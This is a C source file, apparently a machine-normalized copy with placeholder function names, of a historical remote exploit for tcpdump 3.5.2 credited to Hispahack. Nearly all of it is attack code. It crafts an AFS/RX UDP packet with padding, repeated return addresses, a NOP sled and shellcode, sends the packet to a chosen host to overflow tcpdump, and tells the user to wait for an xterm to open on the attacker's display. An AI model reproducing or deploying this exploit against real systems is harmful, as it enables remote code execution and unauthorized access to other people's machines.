#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_1__ sin_addr; void* sin_family; } ;
struct sockaddr {int dummy; } ;
struct rx_header {int /*<<< orphan*/  flags; void* seq; int /*<<< orphan*/  type; } ;
typedef  int /*<<< orphan*/  sin ;
typedef  int /*<<< orphan*/  buffer ;
typedef  int /*<<< orphan*/  addr ;

/* Variables and functions */
 long ADDR ; 
 int AFS_CALL ; 
 void* AF_INET ; 
 int /*<<< orphan*/  FS_RX_DPORT ; 
 int /*<<< orphan*/  FS_RX_SPORT ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 char NOP ; 
 int NUM_ADDR ; 
 int NUM_NOP ; 
 int OFFSET ; 
 int /*<<< orphan*/  RX_CLIENT_INITIATED ; 
 int /*<<< orphan*/  RX_PACKET_TYPE_DATA ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int FUNC0 (char*) ; 
 scalar_t__ FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,...) ; 
 void* FUNC5 (int) ; 
 void* FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,scalar_t__) ; 
 int /*<<< orphan*/  FUNC8 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int FUNC12 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr_in*,int) ; 
 char* shellcode ; 
 int FUNC13 (void*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC15 (char*) ; 

int FUNC16 (int argc, char *argv[]) {

 struct sockaddr_in addr,sin;
 int sock,aux, offset=OFFSET;
 char buffer[4048], *chptr;
 struct rx_header *rxh;
 long int *lptr, return_addr=ADDR;


  FUNC4(stderr,"\n!Hispahack Research Team (http://hispahack.ccc.de)\n");
  FUNC4(stderr,"Tcpdump 3.5.2 xploit by Zhodiac <zhodiac@softhome.net>\n\n");


  if (argc<3) {
    FUNC10("Usage: %s <host> <display> [offset]\n",argv[0]);
    FUNC3(-1);
    }

  if (argc==4) offset=FUNC0(argv[3]);
  return_addr+=offset;

  FUNC4(stderr,"Using return addr: %#lx\n",return_addr);

  addr.sin_family=AF_INET;
  addr.sin_addr.s_addr=FUNC11(argv[1]);
  addr.sin_port=FUNC6(FS_RX_DPORT);

  if ((sock=FUNC13(AF_INET, SOCK_DGRAM,0))<0) {
     FUNC9("socket()");
     FUNC3(-1);
     }

  sin.sin_family=AF_INET;
  sin.sin_addr.s_addr=INADDR_ANY;
  sin.sin_port=FUNC6(FS_RX_SPORT);

  if (FUNC1(sock,(struct sockaddr*)&sin,sizeof(sin))<0) {
      FUNC9("bind()");
      FUNC3(-1);
      }

  FUNC8(buffer,0,sizeof(buffer));
  rxh=(struct rx_header *)buffer;

  rxh->type=RX_PACKET_TYPE_DATA;
  rxh->seq=FUNC5(1);
  rxh->flags=RX_CLIENT_INITIATED;

  lptr=(long int *)(buffer+sizeof(struct rx_header));
  *(lptr++)=FUNC5(AFS_CALL);
  *(lptr++)=FUNC5(1);
  *(lptr++)=FUNC5(2);
  *(lptr++)=FUNC5(3);

  *(lptr++)=FUNC5(420);
  chptr=(char *)lptr;
  FUNC14(chptr,"1 0\n");
  chptr+=4;

  FUNC8(chptr,'A',120);
  chptr+=120;
  lptr=(long int *)chptr;
  for (aux=0;aux<NUM_ADDR;aux++) *(lptr++)=return_addr;
  chptr=(char *)lptr;
  FUNC8(chptr,NOP,NUM_NOP);
  chptr+=NUM_NOP;
  shellcode[30]=(char)(46+FUNC15(argv[2]));
  FUNC7(chptr,shellcode,FUNC15(shellcode));
  chptr+=FUNC15(shellcode);
  FUNC7(chptr,argv[2],FUNC15(argv[2]));
  chptr+=FUNC15(argv[2]);

  FUNC14(chptr," 1\n");

  if (FUNC12(sock,buffer,520,0,&addr,sizeof(addr))==-1) {
     FUNC9("send()");
     FUNC3(-1);
     }

  FUNC4(stderr,"Packet with Overflow sent, now wait for the xterm!!!! :)\n\n");

  FUNC2(sock);
  return(0);
 }